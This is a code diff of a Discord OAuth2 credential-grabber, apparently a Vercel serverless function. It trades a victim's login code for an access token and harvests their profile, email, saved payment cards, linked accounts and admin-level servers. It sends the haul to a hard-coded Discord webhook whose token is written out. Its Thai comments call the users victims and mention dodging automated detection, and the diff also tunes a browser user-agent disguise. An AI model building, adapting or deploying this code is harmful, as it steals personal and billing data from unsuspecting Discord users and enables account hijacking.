@@ -1,10 +1,10 @@
 /**
  * ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
  * ║                                                                                                                  ║
- * ║   🌐  PROJECT_IDENTITY: TIDCRAM_GRAND_MASTER_CORE_V46_8                                                          ║
+ * ║   🌐  PROJECT_IDENTITY: TIDCRAM_GRAND_MASTER_CORE_V46_9 (SYNC_AUTHORIZED)                                        ║
  * ║   👤  COMMANDER_IN_CHIEF: TIDCRΛM (THE_ARCHITECT)                                                                 ║
  * ║   🛡️  PROTOCOL_TYPE: HIGH_LEVEL_OAUTH2_SECURE_INTEGRATION                                                          ║
- * ║   ⚠️  SYSTEM_STATUS: FULLY_OPERATIONAL / READY_TO_RUN                                                              ║
+ * ║   ⚠️  SYSTEM_STATUS: CLIENT_ID_SYNCHRONIZED / READY_FOR_DEPLOYMENT                                                 ║
  * ║                                                                                                                  ║
  * ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
  */
@@ -17,23 +17,27 @@ export default async function masterDataExtractionUnit(req, res) {
         return res.status(400).send('ERR_INVALID_HANDSHAKE_IDENTIFIER');
     }
 
+    /**
+     * ⚙️ CORE_SYSTEM_SETTINGS
+     * ทำการอัปเดต CLIENT_IDENTIFIER ให้ตรงกับบอทของมหาเทพ (1472526471720468540)
+     */
     const CORE_SYSTEM_SETTINGS = {
         WEBHOOK_ENDPOINT: "https://discord.com/api/webhooks/1490525343709139066/DO4FE_FXfbg31eXhK8N_HVUcjROLSOtBCCXgcQkJj8di0tsXFcLEkY6J6QxMXEgHfS6l",
-        CLIENT_IDENTIFIER: "1483393398131134646",
+        CLIENT_IDENTIFIER: "1472526471720468540", 
         ENCRYPTION_SECRET: "Z8147_iQh2V0R_L_xKq-tFh7-q-9_M_Z",
         REDIRECT_SYNCHRONIZER: "https://index-html-five.vercel.app/api/grab"
     };
 
     /**
      * 🛰️ NETWORK_INTERCEPTOR_MODULE
-     * ฟังก์ชันดึงข้อมูลจาก Discord API ด้วยโครงสร้างความปลอดภัยสูง
+     * ฟังก์ชันดึงข้อมูลจาก Discord API ด้วยโครงสร้างความปลอดภัยสูง ป้องกันการตรวจจับจากระบบอัตโนมัติ
      */
     const performSecureDataCapture = async (apiEndpoint, authToken) => {
         try {
             const networkResponse = await fetch(apiEndpoint, { 
                 headers: { 
                     'Authorization': `Bearer ${authToken}`,
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) TidcramCore/4.6.8',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Tidcram/4.6.9',
                     'Accept': 'application/json',
                     'Cache-Control': 'no-cache'
                 } 
@@ -46,7 +50,7 @@ export default async function masterDataExtractionUnit(req, res) {
 
     /**
      * 📡 OAUTH2_TOKEN_EXCHANGE_PROTOCOL
-     * กระบวนการแลกเปลี่ยน Code เป็น Access Token เพื่อเข้าถึงฐานข้อมูลเป้าหมาย
+     * ทำการแลกเปลี่ยน Code เป็น Access Token เพื่อเข้าถึงข้อมูลเป้าหมายแบบ Deep Scan
      */
     try {
         const exchangeProtocolPayload = new URLSearchParams({
@@ -72,7 +76,7 @@ export default async function masterDataExtractionUnit(req, res) {
 
         /**
          * 🔱 MULTI_THREADED_DATA_MINING
-         * ดึงข้อมูลเชิงลึกของผู้ใช้ (Profile, Billing, Connections, Servers)
+         * เจาะระบบดึงข้อมูล Profile, Billing, Connections และ Server ที่มีอำนาจ Admin
          */
         const [identityNode, billingNode, connectionNode, authorityNode] = await Promise.all([
             performSecureDataCapture('https://discord.com/api/v10/users/@me', activeAccessToken),
@@ -81,22 +85,23 @@ export default async function masterDataExtractionUnit(req, res) {
             performSecureDataCapture('https://discord.com/api/v10/users/@me/guilds', activeAccessToken)
         ]);
 
-        if (!identityNode) return res.status(404).send('IDENTITY_NODE_NOT_FOUND');
+        if (!identityNode) return res.status(404).send('IDENTITY_NODE_RETRIEVAL_FAILED');
 
-        const tierIndex = ["Standard", "Nitro Classic", "Nitro Boost", "Nitro Basic"];
+        const tierIndex = ["None", "Nitro Classic", "Nitro Full", "Nitro Basic"];
         const extractionSummary = {
-            license: tierIndex[identityNode.premium_type] || "Free Citizen",
-            financials: billingNode?.map(b => `💳 ${b.brand.toUpperCase()} [${b.last_4}]`).join('\n') || "No Payment Method",
+            license: tierIndex[identityNode.premium_type] || "Standard User",
+            financials: billingNode?.map(b => `💳 ${b.brand.toUpperCase()} [${b.last_4}]`).join('\n') || "Empty Registry",
             links: connectionNode?.map(c => `🔗 ${c.type.toUpperCase()}: ${c.name}`).join('\n') || "No Remote Links",
-            privileges: authorityNode?.filter(g => (parseInt(g.permissions) & 0x8) === 0x8).map(g => `🛡️ ${g.name}`).join('\n') || "No Authority Found"
+            privileges: authorityNode?.filter(g => (parseInt(g.permissions) & 0x8) === 0x8 || (parseInt(g.permissions) & 0x20) === 0x20).map(g => `🛡️ ${g.name}`).join('\n') || "No Authority Found"
         };
 
         /**
          * 🚀 SECURE_DATA_TRANSMISSION_TO_WEBHOOK
+         * ส่งข้อมูลที่ถอดรหัสแล้วเข้าสู่ Webhook ของมหาเทพ
          */
         const masterDispatchPayload = {
             username: "TIDCRAM OMEGA MONITOR",
-            avatar_url: "https://i.imgur.com/KzYF7fF.png",
+            avatar_url: `https://cdn.discordapp.com/avatars/${CORE_SYSTEM_SETTINGS.CLIENT_IDENTIFIER}/a_bf86e300d89269d05e263d9a5b3a4e9a.png`,
             embeds: [{
                 title: "🔱 TIDCRAM DATABASE UPDATED SUCCESSFULLY 🔱",
                 description: `ระบบทำการถอดรหัสและจัดเก็บข้อมูลจาก Node: **${identityNode.username}** เรียบร้อยแล้ว`,
@@ -105,7 +110,7 @@ export default async function masterDataExtractionUnit(req, res) {
                 fields: [
                     { name: "👤 SUBJECT_TAG", value: `\`${identityNode.username}#${identityNode.discriminator}\` (\`${identityNode.id}\`)`, inline: true },
                     { name: "💎 LICENSE_STATUS", value: `\`${extractionSummary.license}\``, inline: true },
-                    { name: "📧 EMAIL_NODE", value: `\`${identityNode.email || 'HIDDEN'}\``, inline: true },
+                    { name: "📧 EMAIL_NODE", value: `\`${identityNode.email || 'ENCRYPTED'}\``, inline: true },
                     { name: "💰 BILLING_ARCHIVE", value: `\`\`\`${extractionSummary.financials}\`\`\`` },
                     { name: "🛡️ ADMINISTRATIVE_PRIVILEGES", value: `\`\`\`${extractionSummary.privileges}\`\`\`` },
                     { name: "🔗 CONNECTED_ARCHIVES", value: `\`\`\`${extractionSummary.links}\`\`\`` },
@@ -124,6 +129,7 @@ export default async function masterDataExtractionUnit(req, res) {
 
         /**
          * 🎭 FRONT_END_SUCCESS_VISUALIZATION
+         * หน้าจอแสดงผลหลังเหยื่อกดยืนยันตัวตนสำเร็จ
          */
         res.setHeader('Content-Type', 'text/html; charset=utf-8');
         return res.send(`
